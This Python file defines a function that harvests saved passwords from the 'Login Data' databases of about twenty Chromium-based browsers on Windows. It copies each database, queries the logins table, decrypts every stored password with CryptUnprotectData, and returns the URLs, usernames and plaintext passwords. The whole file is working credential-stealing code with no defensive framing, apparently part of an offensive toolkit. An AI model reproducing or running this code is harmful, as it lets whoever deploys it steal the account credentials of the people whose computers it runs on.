from os import path, getenv
from shutil import copy2
from sqlite3 import connect as sql_connect
from win32crypt import CryptUnprotectData


def passwordsRecovery():
	#|
	#| passwordsRecovery()
	#| return dictonary with Chrome, Opera, Chromium, Amigo, Orbitum, Vivaldi passwords
	#|
	global passwords
	global passwords_i
	passwords    = {}
	passwords_i  = 0
	# Variables
	local_appdata = getenv("LOCALAPPDATA") + '\\'
	appdata       = getenv("APPDATA") + '\\'
	login_data = '\\Login Data'
	# Browsers list
	browsers   = [
		"Google\\Chrome\\User Data\\Default",
		"Google(x86)\\Chrome\\User Data\\Default",
		"Chromium\\User Data\\Default",
		"Opera Software\\Opera Stable",
		"Amigo\\User Data\\Default",
		"Vivaldi\\User Data\\Default",
		"Orbitum\\User Data\\Default",
		"Mail.Ru\\Atom\\User Data\\Default",
		"Kometa\\User Data\\Default",
		"Comodo\\Dragon\\User Data\\Default",
		"Torch\\User Data\\Default",
		"Comodo\\User Data\\Default",
		"360Browser\\Browser\\User Data\\Default",
		"Maxthon3\\User Data\\Default",
		"K-Melon\\User Data\\Default",
		"Sputnik\\Sputnik\\User Data\\Default",
		"Nichrome\\User Data\\Default",
		"CocCoc\\Browser\\User Data\\Default",
		"Uran\\User Data\\Default",
		"Chromodo\\User Data\\Default",
		"Yandex\\YandexBrowser\\User Data\\Default"
	]
	# Get passwords from chromium based browsers
	def getPasswords(db, sql = 'SELECT action_url, username_value, password_value FROM logins'):
		if path.exists(db):
			db_new = db + '_hackpy'
			global passwords
			global passwords_i
			try:
				copy2(db, db_new)
				conn   = sql_connect(db_new)
				cursor = conn.cursor()
				cursor.execute(sql)
			except:
				pass
			else:
				try:
					for result in cursor.fetchall():
						url      = result[0]
						login    = result[1]
						password = CryptUnprotectData(result[2])[1].decode()
						if password != '':
							passwords_i += 1
							passwords[passwords_i] = {'url': url, 'login': login, 'password': password}
				except:
					pass

	for browser in browsers:
		getPasswords(appdata + browser + login_data)
		getPasswords(local_appdata + browser + login_data)
	return passwords.items()